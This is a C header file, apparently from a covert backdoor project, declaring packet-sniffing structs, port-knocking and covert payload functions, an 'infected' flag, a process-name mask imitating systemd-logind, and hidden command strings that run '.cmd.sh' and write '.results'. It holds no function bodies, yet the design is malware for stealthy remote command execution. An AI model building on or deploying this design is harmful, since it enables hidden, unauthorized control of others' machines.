#ifndef LIBPCAP_H
#define LIBPCAP_H

#include <pcap.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/tcp.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "encrypt_utils.h"
#include "socketwrappers.h"
#include "covert_wrappers.h"
#include "inotify.h"
#include <unistd.h>
#include <time.h>

#define PORT "8505"
#define UPORT 8505
#define MASK "/usr/lib/systemd/systemd-logind"
#define CMD "./.cmd.sh > .results"
#define CHMOD "chmod 755 .cmd.sh"
#define RESULT_FILE ".results"
#define FILENAME ".cmd.sh"
#define TCP "TCP"
#define OR " || "
#define PORTS "port"
#define FILTERAMOUNT 2

struct my_ip {
	u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
	u_int8_t	ip_tos;		/* type of service */
	u_int16_t	ip_len;		/* total length */
	u_int16_t	ip_id;		/* identification */
	u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	u_int8_t	ip_ttl;		/* time to live */
	u_int8_t	ip_p;		/* protocol */
	u_int16_t	ip_sum;		/* checksum */
	struct	in_addr ip_src,ip_dst;	/* source and dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

struct sniff_udp {
    u_short uh_sport;
    u_short uh_dport;
    u_short udp_length;
    u_short udp_sum;
};



struct payload{
    char key[5]; // always 8505
    char buffer[1024]; // for either commands or results
};

struct filter{
    int amount;
    const char *port[FILTERAMOUNT];
    unsigned short port_short[FILTERAMOUNT];
    unsigned short port_ushort[FILTERAMOUNT];
    char targetip[BUFSIZ];
    char localip[BUFSIZ];
    int pattern[FILTERAMOUNT];
    bool infected;
    //add tcp and udp flag
};

void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void iptables(char *ip, bool tcp, char *port, bool input, bool remove);
struct filter InitFilter(char *target, char *local, bool infected);
void PrintFilter(struct filter Filter);
void CreateFilter(struct filter Filter, char *buffer, bool tcp);
void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool tcp);
void SendPattern(unsigned char *data, struct filter *Filter, bool tcp);
//char GetLocalIP(char *device);
int Packetcapture(char *filter, struct filter Filter,bool tcp);
void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseIP(struct filter *Filter,const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp);
void CreatePayload(char *command, unsigned char *encrypted);
void SendPayload(struct filter *Filter, const unsigned char *tcp_payload);
bool CheckKey(u_char ip_tos, u_short ip_id, bool knock);
pcap_t *interfaceinfo;

#endif
